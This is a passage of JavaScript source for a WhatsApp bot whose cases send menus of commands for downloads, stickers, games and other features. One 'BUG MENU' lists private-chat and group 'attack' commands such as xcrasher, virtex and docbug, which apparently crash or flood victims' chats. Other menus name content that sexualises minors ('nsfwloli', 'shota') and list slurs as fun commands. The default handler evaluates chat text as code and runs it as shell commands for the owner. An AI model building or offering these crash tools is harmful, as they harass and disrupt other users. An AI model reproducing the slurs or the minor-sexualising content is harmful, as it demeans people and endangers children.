  {buttonId: 'owner', buttonText: {displayText: 'Owner 🤣'}, type: 1}
]
const buttonMessage = {
    image: unicorn,
    caption: `╔═══════✪ DOWNLOAD 	
╠${prefix}tiktok [url]
╠${prefix}tiktokaudio [url]
╠${prefix}instagram [url]
╠${prefix}spotify [url]
╠${prefix}mediafire [url]
╠${prefix}ytmp3 [url|quality]
╠${prefix}ytmp4 [url|quality]
╠${prefix}gitclone [repo link]
╚═════════════✪`,
    footer: `${botname}`,
    buttons: buttons,
    headerType: 4
}
const sendMsg = await XeonBotInc.sendMessage(m.chat, buttonMessage)
}
break
            case 'searchmenu':{
var unicorn = await getBuffer(picak+'Search Menu')

const buttons = [
  {buttonId: 'script', buttonText: {displayText: 'Script 🔖'}, type: 1},
  {buttonId: 'donate', buttonText: {displayText: 'Donate 🍵'}, type: 1},
  {buttonId: 'owner', buttonText: {displayText: 'Owner 🤣'}, type: 1}
]
const buttonMessage = {
    image: unicorn,
    caption: `╔═══════✪ SEARCH 	
╠${prefix}play [query]
╠${prefix}song [query]
╠${prefix}yts [query]
╠${prefix}lyrics [query]
╠${prefix}google [query]
╠${prefix}google [query]
╠${prefix}anime [query]
╠${prefix}pinterest [query]
╠${prefix}image [query]
╠${prefix}wallpaper [query]
╠${prefix}searchno [number]
╠${prefix}horoscope [query]
╠${prefix}imdb [movie name]
╠${prefix}weather [loc name]
╠${prefix}genshin [char name]
╠${prefix}wikimedia [query]
╠${prefix}ytsearch [query]
╠${prefix}ringtone [query]
╚═════════════✪`,
    footer: `${botname}`,
    buttons: buttons,
    headerType: 4
}
const sendMsg = await XeonBotInc.sendMessage(m.chat, buttonMessage)
}
break
            case 'convertmenu':{
var unicorn = await getBuffer(picak+'Convert Menu')

const buttons = [
  {buttonId: 'script', buttonText: {displayText: 'Script 🔖'}, type: 1},
  {buttonId: 'donate', buttonText: {displayText: 'Donate 🍵'}, type: 1},
  {buttonId: 'owner', buttonText: {displayText: 'Owner 🤣'}, type: 1}
]
const buttonMessage = {
    image: unicorn,
    caption: `╔═══════✪ CONVERT 	
╠ ${prefix}toimage [reply stick]
╠ ${prefix}sticker [reply img|gif]
╠ ${prefix}take [reply img|gif|stik]
╠ ${prefix}smeme [reply img]
╠ ${prefix}emoji [emoji]
╠ ${prefix}tovideo [reply img]
╠ ${prefix}togif [reply stick]
╠ ${prefix}tovn [reply aud]
╠ ${prefix}tomp3 [reply vn]
╠ ${prefix}toaudio [reply vid]
╠ ${prefix}ebinary [reply txt]
╠ ${prefix}dbinary [reply txt]
╠ ${prefix}tinyurl [link]
╠ ${prefix}styletext [text]
╠${prefix}volume [reply aud]
╠${prefix}bass [reply aud]
╠${prefix}blown [reply aud]
╠${prefix}deep [reply aud]
╠${prefix}earrape [reply aud]
╠${prefix}fast [reply aud]
╠${prefix}fat [reply aud]
╠${prefix}nightcore [reply aud]
╠${prefix}reverse [reply aud]
╠${prefix}robot [reply aud]
╠${prefix}slow [reply aud]
╠${prefix}smooth [reply aud]
╠${prefix}squirrel [reply aud]
╚═════════════✪`,
    footer: `${botname}`,
    buttons: buttons,
    headerType: 4
}
const sendMsg = await XeonBotInc.sendMessage(m.chat, buttonMessage)
}
break
case 'randomimagemenu':{
var unicorn = await getBuffer(picak+'Random Image Menu')

const buttons = [
  {buttonId: 'script', buttonText: {displayText: 'Script 🔖'}, type: 1},
  {buttonId: 'donate', buttonText: {displayText: 'Donate 🍵'}, type: 1},
  {buttonId: 'owner', buttonText: {displayText: 'Owner 🤣'}, type: 1}
]
const buttonMessage = {
    image: unicorn,
    caption: `╔═══════✪ RANDOM IMG 	
╠${prefix}coffee
╠${prefix}woof
╠${prefix}meow
╠${prefix}lizard
╠${prefix}chinese
╠${prefix}japanese
╠${prefix}korean
╠${prefix}indo
╠${prefix}thai
╠${prefix}vietnamese
╠${prefix}malay
╠${prefix}hijab
╠${prefix}randomgirl
╠${prefix}randomboy
╠${prefix}aesthetic
╠${prefix}antiwork
╠${prefix}cosplay
╠${prefix}car
╠${prefix}bike
╠${prefix}doggo
╠${prefix}cat
╠${prefix}notnot
╠${prefix}kayes
╠${prefix}justina
╠${prefix}ryujin
╠${prefix}boneka
╠${prefix}rose
╠${prefix}kpop
╠${prefix}blackpink
╠${prefix}ulzzangboy
╠${prefix}ulzzanggirl
╠${prefix}pubg
╠${prefix}hacking
╠${prefix}profilepicture
╠${prefix}couplepicture
╠${prefix}wallphone
╠${prefix}wallml
╚═════════════✪`,
    footer: `${botname}`,
    buttons: buttons,
    headerType: 4
}
const sendMsg = await XeonBotInc.sendMessage(m.chat, buttonMessage)
}
break
case 'randomvideomenu':{
var unicorn = await getBuffer(picak+'Random Video Menu')

const buttons = [
  {buttonId: 'script', buttonText: {displayText: 'Script 🔖'}, type: 1},
  {buttonId: 'donate', buttonText: {displayText: 'Donate 🍵'}, type: 1},
  {buttonId: 'owner', buttonText: {displayText: 'Owner 🤣'}, type: 1}
]
const buttonMessage = {
    image: unicorn,
    caption: `╔═══════✪ RANDOM VIDEO
╠${prefix}tiktokgirl	
╠${prefix}tiktoknukhty
╠${prefix}tiktokpanrika
╠${prefix}tiktokkayes
╠${prefix}tiktoknotnot
╠${prefix}tiktokghea
╠${prefix}tiktoksantuy
╠${prefix}tiktokbocil
╚═════════════✪`,
    footer: `${botname}`,
    buttons: buttons,
    headerType: 4
}
const sendMsg = await XeonBotInc.sendMessage(m.chat, buttonMessage)
}
break
           case 'emotemenu':{
var unicorn = await getBuffer(picak+'Emote Menu')

const buttons = [
  {buttonId: 'script', buttonText: {displayText: 'Script 🔖'}, type: 1},
  {buttonId: 'donate', buttonText: {displayText: 'Donate 🍵'}, type: 1},
  {buttonId: 'owner', buttonText: {displayText: 'Owner 🤣'}, type: 1}
]
const buttonMessage = {
    image: unicorn,
    caption: `╔═══════✪ EMOTE 	
╠${prefix}instagramemoji
╠${prefix}facebookemoji
╠${prefix}iphoneemoji
╠${prefix}samsungemoji
╠${prefix}joyemoji
╠${prefix}skypeemoji
╠${prefix}twitteremoji
╠${prefix}whatsappemoji
╠${prefix}microsoftemoji
╠${prefix}googleemoji
╠${prefix}pediaemoji
╠${prefix}microsoftemoji
╚═════════════✪`,
    footer: `${botname}`,
    buttons: buttons,
    headerType: 4
}
const sendMsg = await XeonBotInc.sendMessage(m.chat, buttonMessage)
}
break
            case 'imageeffectmenu':{
var unicorn = await getBuffer(picak+'Image Effect Menu')

const buttons = [
  {buttonId: 'script', buttonText: {displayText: 'Script 🔖'}, type: 1},
  {buttonId: 'donate', buttonText: {displayText: 'Donate 🍵'}, type: 1},
  {buttonId: 'owner', buttonText: {displayText: 'Owner 🤣'}, type: 1}
]
const buttonMessage = {
    image: unicorn,
    caption: `╔═════✪ IMG EFFECT 	
╠${prefix}removebg [reply img]
╚═════════════✪`,
    footer: `${botname}`,
    buttons: buttons,
    headerType: 4
}
const sendMsg = await XeonBotInc.sendMessage(m.chat, buttonMessage)
}
break
case 'animemenu':{
var unicorn = await getBuffer(picak+'Anime Menu')

const buttons = [
  {buttonId: 'script', buttonText: {displayText: 'Script 🔖'}, type: 1},
  {buttonId: 'donate', buttonText: {displayText: 'Donate 🍵'}, type: 1},
  {buttonId: 'owner', buttonText: {displayText: 'Owner 🤣'}, type: 1}
]
const buttonMessage = {
    image: unicorn,
    caption: `╔═══════✪ ANIME 	
╠${prefix}animeneko
╠${prefix}waifu
╠${prefix}shinobu
╠${prefix}animeawoo
╠${prefix}animewaifu
╠${prefix}foxgirl
╠${prefix}animenom
╠${prefix}goose
╠${prefix}8ball
╠${prefix}avatar
╠${prefix}tickle
╠${prefix}gecg
╠${prefix}feed
╠${prefix}husbu
╠${prefix}neko2
╠${prefix}randomanime
╠${prefix}shota
╠${prefix}waifu2
╠${prefix}animeslap
╠${prefix}animepat
╠${prefix}animeneko
╠${prefix}animekiss
╠${prefix}animewlp
╠${prefix}animecuddle
╠${prefix}animecry
╠${prefix}animekill
╠${prefix}animelick
╠${prefix}animebite
╠${prefix}animeyeet
╠${prefix}animebully
╠${prefix}animebonk
╠${prefix}animewink
╠${prefix}animepoke
╠${prefix}animesmile
╠${prefix}animewave
╠${prefix}animeawoo
╠${prefix}animeblush
╠${prefix}animesmug
╠${prefix}animeglomp
╠${prefix}animehappy
╠${prefix}animedance
╠${prefix}animecringe
╠${prefix}animehighfive
╠${prefix}animehandhold
╠${prefix}animemegumin
╠${prefix}animemegumin
╠${prefix}animesmug
╠${prefix}loli-waifu
╠${prefix}couplepp
╠${prefix}animewall [query]
╠${prefix}animewall2 [query]
╚═════════════✪`,
    footer: `${botname}`,
    buttons: buttons,
    headerType: 4
}
const sendMsg = await XeonBotInc.sendMessage(m.chat, buttonMessage)
}
break
            case 'stickermenu':{
var unicorn = await getBuffer(picak+'Sticker Menu')

const buttons = [
  {buttonId: 'script', buttonText: {displayText: 'Script 🔖'}, type: 1},
  {buttonId: 'donate', buttonText: {displayText: 'Donate 🍵'}, type: 1},
  {buttonId: 'owner', buttonText: {displayText: 'Owner 🤣'}, type: 1}
]
const buttonMessage = {
    image: unicorn,
    caption: `╔═══════✪ STICKER 	
╠ ${prefix}patrick
╠ ${prefix}emoji
╠ ${prefix}emojimix
╠ ${prefix}doge
╠ ${prefix}lovesticker
╠ ${prefix}animestick
╠ ${prefix}spongebob
╠ ${prefix}gojosatoru
╠ ${prefix}nicholas
╠ ${prefix}cartoon
╠ ${prefix}stickman
╚═════════════✪`,
    footer: `${botname}`,
    buttons: buttons,
    headerType: 4
}
const sendMsg = await XeonBotInc.sendMessage(m.chat, buttonMessage)
}
break
case 'animestickermenu':{
var unicorn = await getBuffer(picak+'Anime Sticker Menu')

const buttons = [
  {buttonId: 'script', buttonText: {displayText: 'Script 🔖'}, type: 1},
  {buttonId: 'donate', buttonText: {displayText: 'Donate 🍵'}, type: 1},
  {buttonId: 'owner', buttonText: {displayText: 'Owner 🤣'}, type: 1}
]
const buttonMessage = {
    image: unicorn,
    caption: `╔═══════✪ ANIME STICKER 	
╠${prefix}loli
╠${prefix}bully
╠${prefix}cuddle
╠${prefix}cry
╠${prefix}hug
╠${prefix}awoo
╠${prefix}kiss
╠${prefix}lick
╠${prefix}pat
╠${prefix}smug
╠${prefix}bonk
╠${prefix}yeet
╠${prefix}blush
╠${prefix}smile
╠${prefix}wave
╠${prefix}highfive
╠${prefix}handhold
╠${prefix}nom
╠${prefix}glomp
╠${prefix}bite
╠${prefix}slap
╠${prefix}kill
╠${prefix}happy
╠${prefix}wink
╠${prefix}poke
╠${prefix}dance
╠${prefix}cringe
╠${prefix}neko
╠${prefix}gura
╚═════════════✪`,
    footer: `${botname}`,
    buttons: buttons,
    headerType: 4
}
const sendMsg = await XeonBotInc.sendMessage(m.chat, buttonMessage)
}
break 
case 'nsfwmenu':{
var unicorn = await getBuffer(picak+'Nsfw Menu')

const buttons = [
  {buttonId: 'script', buttonText: {displayText: 'Script 🔖'}, type: 1},
  {buttonId: 'donate', buttonText: {displayText: 'Donate 🍵'}, type: 1},
  {buttonId: 'owner', buttonText: {displayText: 'Owner 🤣'}, type: 1}
]
const buttonMessage = {
    image: unicorn,
    caption: `╔═══════✪ NSFW 	
╠${prefix}gifhentai
╠${prefix}gifblowjob
╠${prefix}hentaivideo
╠${prefix}hneko
╠${prefix}nwaifu
╠${prefix}animespank
╠${prefix}trap
╠${prefix}gasm
╠${prefix}ahegao
╠${prefix}ass
╠${prefix}bdsm
╠${prefix}blowjob
╠${prefix}cuckold
╠${prefix}cum
╠${prefix}milf
╠${prefix}eba
╠${prefix}ero
╠${prefix}femdom
╠${prefix}foot
╠${prefix}gangbang
╠${prefix}glasses
╠${prefix}hentai
╠${prefix}jahy
╠${prefix}manga
╠${prefix}masturbation
╠${prefix}neko-hentai
╠${prefix}neko-hentai2
╠${prefix}nsfwloli
╠${prefix}orgy
╠${prefix}panties
╠${prefix}pussy
╠${prefix}tentacles
╠${prefix}thights
╠${prefix}yuri
╠${prefix}zettai
╚═════════════✪`,
    footer: `${botname}`,
    buttons: buttons,
    headerType: 4
}
const sendMsg = await XeonBotInc.sendMessage(m.chat, buttonMessage)
}
break
case 'funmenu':{
var unicorn = await getBuffer(picak+'Fun Menu')

const buttons = [
  {buttonId: 'script', buttonText: {displayText: 'Script 🔖'}, type: 1},
  {buttonId: 'donate', buttonText: {displayText: 'Donate 🍵'}, type: 1},
  {buttonId: 'owner', buttonText: {displayText: 'Owner 🤣'}, type: 1}
]
const buttonMessage = {
    image: unicorn,
    caption: `╔═══════✪ Fun 
╠ ${prefix}say [text]	
╠ ${prefix}define [text]
╠ ${prefix}how [text]
╠ ${prefix}when [text]
╠ ${prefix}where [text]
╠ ${prefix}is [text]
╠ ${prefix}what [text]
╠ ${prefix}can [text]
╠ ${prefix}rate [text]
╠ ${prefix}coolcheck [tag]
╠ ${prefix}stupidcheck [tag]
╠ ${prefix}waifucheck [tag]
╠ ${prefix}evilcheck [tag]
╠ ${prefix}dogcheck [tag]
╠ ${prefix}hotcheck [tag]
╠ ${prefix}smartcheck [tag]
╠ ${prefix}uncleancheck [tag]
╠ ${prefix}greatcheck [tag]
╠ ${prefix}beautifulcheck [tag]
╠ ${prefix}awesomecheck [tag]
╠ ${prefix}prettycheck [tag]
╠ ${prefix}lesbiancheck [tag]
╠ ${prefix}gaycheck [tag]
╠ ${prefix}cutecheck [tag]
╠ ${prefix}uglycheck [tag]
╠ ${prefix}hornycheck [tag]
╠ ${prefix}charactercheck [tag]
╠ ${prefix}lovelycheck [tag]
╠ ${prefix}couple
╠ ${prefix}soulmate
╠ ${prefix}hot
╠ ${prefix}sexy
╠ ${prefix}kind
╠ ${prefix}idiot
╠ ${prefix}handsome
╠ ${prefix}beautiful
╠ ${prefix}cute
╠ ${prefix}pretty
╠ ${prefix}lesbian
╠ ${prefix}noob
╠ ${prefix}bastard
╠ ${prefix}foolish
╠ ${prefix}nerd
╠ ${prefix}asshole
╠ ${prefix}gay
╠ ${prefix}smart
╠ ${prefix}stubble
╠ ${prefix}dog
╠ ${prefix}horny
╠ ${prefix}cunt
╠ ${prefix}wibu
╠ ${prefix}noobra
╠ ${prefix}nibba
╠ ${prefix}nibbi
╠ ${prefix}comrade
╠ ${prefix}mumu
╠ ${prefix}rascal
╠ ${prefix}scumbag
╠ ${prefix}nuts
╠ ${prefix}fagot
╠ ${prefix}scoundrel
╠ ${prefix}ditch
╠ ${prefix}dope
╠ ${prefix}gucci
╠ ${prefix}lit
╠ ${prefix}dumbass
╠ ${prefix}crackhead
╠ ${prefix}mf
╠ ${prefix}motherfucker
╠ ${prefix}sucker
╠ ${prefix}fuckboy
╠ ${prefix}playboy
╠ ${prefix}fuckgirl
╠ ${prefix}playgirl
╠ ${prefix}quotes
╚═════════════✪`,
    footer: `${botname}`,
    buttons: buttons,
    headerType: 4
}
const sendMsg = await XeonBotInc.sendMessage(m.chat, buttonMessage)
}
break
case 'soundmenu':{
var unicorn = await getBuffer(picak+'Music Menu')

const buttons = [
  {buttonId: 'script', buttonText: {displayText: 'Script 🔖'}, type: 1},
  {buttonId: 'donate', buttonText: {displayText: 'Donate 🍵'}, type: 1},
  {buttonId: 'owner', buttonText: {displayText: 'Owner 🤣'}, type: 1}
]
const buttonMessage = {
    image: unicorn,
    caption: `╔═══════✪ Sound 	
╠ ${prefix}sound1
╠ ${prefix}sound2
╠ ${prefix}sound3
╠ ${prefix}sound4
╠ ${prefix}sound5
╠ ${prefix}sound6
╠ ${prefix}sound7
╠ ${prefix}sound8
╠ ${prefix}sound9
╠ ${prefix}sound10
╠ ${prefix}sound11
╠ ${prefix}sound12
╠ ${prefix}sound13
╠ ${prefix}sound14
╠ ${prefix}sound15
╠ ${prefix}sound16
╠ ${prefix}sound17
╠ ${prefix}sound18
╠ ${prefix}sound19
╠ ${prefix}sound20
╠ ${prefix}sound21
╠ ${prefix}sound22
╠ ${prefix}sound23
╠ ${prefix}sound24
╠ ${prefix}sound25
╠ ${prefix}sound26
╠ ${prefix}sound27
╠ ${prefix}sound28
╠ ${prefix}sound29
╠ ${prefix}sound30
╠ ${prefix}sound31
╠ ${prefix}sound32
╠ ${prefix}sound33
╠ ${prefix}sound34
╠ ${prefix}sound35
╠ ${prefix}sound36
╠ ${prefix}sound37
╠ ${prefix}sound38
╠ ${prefix}sound39
╠ ${prefix}sound40
╠ ${prefix}sound41
╠ ${prefix}sound42
╠ ${prefix}sound43
╠ ${prefix}sound44
╠ ${prefix}sound45
╠ ${prefix}sound46
╠ ${prefix}sound47
╠ ${prefix}sound48
╠ ${prefix}sound49
╠ ${prefix}sound50
╠ ${prefix}sound51
╠ ${prefix}sound52
╠ ${prefix}sound53
╠ ${prefix}sound54
╠ ${prefix}sound55
╠ ${prefix}sound56
╠ ${prefix}sound57
╠ ${prefix}sound58
╠ ${prefix}sound59
╠ ${prefix}sound60
╠ ${prefix}sound61
╠ ${prefix}sound62
╠ ${prefix}sound63
╠ ${prefix}sound64
╠ ${prefix}sound65
╠ ${prefix}sound66
╠ ${prefix}sound67
╠ ${prefix}sound68
╠ ${prefix}sound69
╠ ${prefix}sound70
╠ ${prefix}sound71
╠ ${prefix}sound72
╠ ${prefix}sound73
╠ ${prefix}sound74
╠ ${prefix}sound75
╠ ${prefix}sound76
╠ ${prefix}sound77
╠ ${prefix}sound78
╠ ${prefix}sound79
╠ ${prefix}sound80
╠ ${prefix}sound81
╠ ${prefix}sound82
╠ ${prefix}sound83
╠ ${prefix}sound84
╠ ${prefix}sound85
╠ ${prefix}sound86
╠ ${prefix}sound87
╠ ${prefix}sound88
╠ ${prefix}sound89
╠ ${prefix}sound90
╠ ${prefix}sound91
╠ ${prefix}sound92
╠ ${prefix}sound93
╠ ${prefix}sound94
╠ ${prefix}sound95
╠ ${prefix}sound96
╠ ${prefix}sound97
╠ ${prefix}sound98
╠ ${prefix}sound99
╠ ${prefix}sound100
╠ ${prefix}sound101
╠ ${prefix}sound102
╠ ${prefix}sound103
╠ ${prefix}sound104
╠ ${prefix}sound105
╠ ${prefix}sound106
╠ ${prefix}sound107
╠ ${prefix}sound108
╠ ${prefix}sound109
╠ ${prefix}sound110
╠ ${prefix}sound111
╠ ${prefix}sound112
╠ ${prefix}sound113
╠ ${prefix}sound114
╠ ${prefix}sound115
╠ ${prefix}sound116
╠ ${prefix}sound117
╠ ${prefix}sound118
╠ ${prefix}sound119
╠ ${prefix}sound120
╠ ${prefix}sound121
╠ ${prefix}sound122
╠ ${prefix}sound123
╠ ${prefix}sound124
╠ ${prefix}sound125
╠ ${prefix}sound126
╠ ${prefix}sound127
╠ ${prefix}sound128
╠ ${prefix}sound129
╠ ${prefix}sound130
╠ ${prefix}sound131
╠ ${prefix}sound132
╠ ${prefix}sound133
╠ ${prefix}sound134
╠ ${prefix}sound135
╠ ${prefix}sound136
╠ ${prefix}sound137
╠ ${prefix}sound138
╠ ${prefix}sound139
╠ ${prefix}sound140
╠ ${prefix}sound141
╠ ${prefix}sound142
╠ ${prefix}sound143
╠ ${prefix}sound144
╠ ${prefix}sound145
╠ ${prefix}sound146
╠ ${prefix}sound147
╠ ${prefix}sound148
╠ ${prefix}sound149
╠ ${prefix}sound150
╠ ${prefix}sound151
╠ ${prefix}sound152
╠ ${prefix}sound153
╠ ${prefix}sound154
╠ ${prefix}sound155
╠ ${prefix}sound156
╠ ${prefix}sound157
╠ ${prefix}sound158
╠ ${prefix}sound159
╠ ${prefix}sound160
╠ ${prefix}sound161
╚═════════════✪`,
    footer: `${botname}`,
    buttons: buttons,
    headerType: 4
}
const sendMsg = await XeonBotInc.sendMessage(m.chat, buttonMessage)
}
break
case 'gamemenu':{
var unicorn = await getBuffer(picak+'Game Menu')

const buttons = [
  {buttonId: 'script', buttonText: {displayText: 'Script 🔖'}, type: 1},
  {buttonId: 'donate', buttonText: {displayText: 'Donate 🍵'}, type: 1},
  {buttonId: 'owner', buttonText: {displayText: 'Owner 🤣'}, type: 1}
]
const buttonMessage = {
    image: unicorn,
    caption: `╔═══════✪ GAME 	
╠ ${prefix}truth
╠ ${prefix}dare
╠ ${prefix}tictactoe
╠ ${prefix}delttt
╠ ${prefix}guess [option]
╠ ${prefix}math [mode]
╠ ${prefix}suitpvp [tag]
╚═════════════✪`,
    footer: `${botname}`,
    buttons: buttons,
    headerType: 4
}
const sendMsg = await XeonBotInc.sendMessage(m.chat, buttonMessage)
}
break
            case 'anonymousmenu':{
var unicorn = await getBuffer(picak+'Anonymous Menu')

const buttons = [
  {buttonId: 'script', buttonText: {displayText: 'Script 🔖'}, type: 1},
  {buttonId: 'donate', buttonText: {displayText: 'Donate 🍵'}, type: 1},
  {buttonId: 'owner', buttonText: {displayText: 'Owner 🤣'}, type: 1}
]
const buttonMessage = {
    image: unicorn,
    caption: `╔═══✪ ANONYMOUS 	
╠${prefix}anonymous
╠${prefix}start
╠${prefix}next
╠${prefix}leave
╚═════════════✪`,
    footer: `${botname}`,
    buttons: buttons,
    headerType: 4
}
const sendMsg = await XeonBotInc.sendMessage(m.chat, buttonMessage)
}
break
case 'databasemenu':{
var unicorn = await getBuffer(picak+'Database Menu')

const buttons = [
  {buttonId: 'script', buttonText: {displayText: 'Script 🔖'}, type: 1},
  {buttonId: 'donate', buttonText: {displayText: 'Donate 🍵'}, type: 1},
  {buttonId: 'owner', buttonText: {displayText: 'Owner 🤣'}, type: 1}
]
const buttonMessage = {
    image: unicorn,
    caption: `╔═══✪ DATABASE 	
╠ ${prefix}setcmd
╠ ${prefix}listcmd
╠ ${prefix}delcmd
╠ ${prefix}lockcmd
╠ ${prefix}addmsg
╠ ${prefix}listmsg
╠ ${prefix}getmsg
╠ ${prefix}delmsg
╚═════════════✪`,
    footer: `${botname}`,
    buttons: buttons,
    headerType: 4
}
const sendMsg = await XeonBotInc.sendMessage(m.chat, buttonMessage)
}
break
case 'othermenu':{
var unicorn = await getBuffer(picak+'Other Menu')

const buttons = [
  {buttonId: 'script', buttonText: {displayText: 'Script 🔖'}, type: 1},
  {buttonId: 'donate', buttonText: {displayText: 'Donate 🍵'}, type: 1},
  {buttonId: 'owner', buttonText: {displayText: 'Owner 🤣'}, type: 1}
]
const buttonMessage = {
    image: unicorn,
    caption: `╔═══════✪ OTHER 	
╠ ${prefix}afk
╠ ${prefix}id
╠ ${prefix}toqr [link]
╠ ${prefix}repeat
╠ ${prefix}readmore [text]
╠ ${prefix}toviewonce
╠ ${prefix}fliptext [text]] 
╠ ${prefix}alive
╠ ${prefix}script
╠ ${prefix}ping
╠ ${prefix}owner
╠ ${prefix}menu
╠ ${prefix}delete
╠ ${prefix}chatinfo
╠ ${prefix}quoted
╠ ${prefix}listpc
╠ ${prefix}listgc
╠ ${prefix}donate
╠ ${prefix}request
╠ ${prefix}report [bug]
╚═════════════✪`,
    footer: `${botname}`,
    buttons: buttons,
    headerType: 4
}
const sendMsg = await XeonBotInc.sendMessage(m.chat, buttonMessage)
}
break
case 'warmenu':{
var unicorn = await getBuffer(picak+'War Menu')

const buttons = [
  {buttonId: 'script', buttonText: {displayText: 'Script 🔖'}, type: 1},
  {buttonId: 'donate', buttonText: {displayText: 'Donate 🍵'}, type: 1},
  {buttonId: 'owner', buttonText: {displayText: 'Owner 🤣'}, type: 1}
]
const buttonMessage = {
    image: unicorn,
    caption: `╔═══════✪「 BUG MENU 」	
╠════☾pc attack☽
╠${prefix}pcbut [number]
╠${prefix}pcvn [number]
╠${prefix}pcstick [number]
╠${prefix}pcfast [number]
╠${prefix}pcslow [number]
╠${prefix}pcbunny [number]
╠${prefix}xcrasher [amount]
╠${prefix}pccontact [amount]
╠${prefix}virtex5 [amount]
╠${prefix}flower [amount]
╠${prefix}pollbug [amount]
╠${prefix}catalogbug [amount]
╠${prefix}trollybug [amount]
╠${prefix}trollybug2 [amount]
╠════☾gc attack☽
╠${prefix}gcslow
╠${prefix}gcfast
╠${prefix}gcbunny
╠${prefix}tagallbug
╠════☾pc & gc attack☽
╠${prefix}vnbug [amount]
╠${prefix}docbug [amount]
╠${prefix}pcgcslow [number]
╠${prefix}pcgcfast [number]
╠${prefix}pcgcbunny [number]
╠${prefix}textshot
╠${prefix}docfuck [amount]
╠${prefix}docsoft [amount]
╠${prefix}docsoft2 [amount]
╚═════════════✪`,
    footer: `${botname}`,
    buttons: buttons,
    headerType: 4
}
const sendMsg = await XeonBotInc.sendMessage(m.chat, buttonMessage)
}
break
            default:
                if (budy.startsWith('=>')) {
                    if (!isCreator) return m.reply(mess.owner)
                    function Return(sul) {
                        sat = JSON.stringify(sul, null, 2)
                        bang = util.format(sat)
                            if (sat == undefined) {
                                bang = util.format(sul)
                            }
                            return m.reply(bang)
                    }
                    try {
                        m.reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
                    } catch (e) {
                        m.reply(String(e))
                    }
                }

                if (budy.startsWith('>')) {
                    if (!isCreator) return m.reply(mess.owner)
                    try {
                        let evaled = await eval(budy.slice(2))
                        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
                        await m.reply(evaled)
                    } catch (err) {
                        await m.reply(String(err))
                    }
                }

                if (budy.startsWith('$')) {
                    if (!isCreator) return m.reply(mess.owner)
                    exec(budy.slice(2), (err, stdout) => {
                        if(err) return m.reply(err)
                        if (stdout) return m.reply(stdout)
                    })
                }
			
		if (m.chat.endsWith('@s.whatsapp.net') && isCmd) {
                    this.anonymous = this.anonymous ? this.anonymous : {}
                    let room = Object.values(this.anonymous).find(room => [room.a, room.b].includes(m.sender) && room.state === 'CHATTING')
                    if (room) {
                        if (/^.*(next|leave|start)/.test(m.text)) return
                        if (['.next', '.leave', '.stop', '.start', 'Find Partners', 'Keluar', 'Lanjut', 'Stop'].includes(m.text)) return
                        let other = [room.a, room.b].find(user => user !== m.sender)
                        m.copyNForward(other, true, m.quoted && m.quoted.fromMe ? {
                            contextInfo: {
                                ...m.msg.contextInfo,
                                forwardingScore: 0,
                                isForwarded: true,
                                participant: other
                            }
                        } : {})
                    }
                    return !0
                }
			
		if (isCmd && budy.toLowerCase() != undefined) {
		    if (m.chat.endsWith('broadcast')) return
		    if (m.isBaileys) return
		    let msgs = global.db.data.database
		    if (!(budy.toLowerCase() in msgs)) return
		    XeonBotInc.copyNForward(m.chat, msgs[budy.toLowerCase()], true)
		}
        }       

    } catch (err) {
        m.reply(util.format(err))
    }
}


let file = require.resolve(__filename)
fs.watchFile(file, () => {
	fs.unwatchFile(file)
	console.log(chalk.redBright(`Update ${__filename}`))
	delete require.cache[file]
	require(file)
})
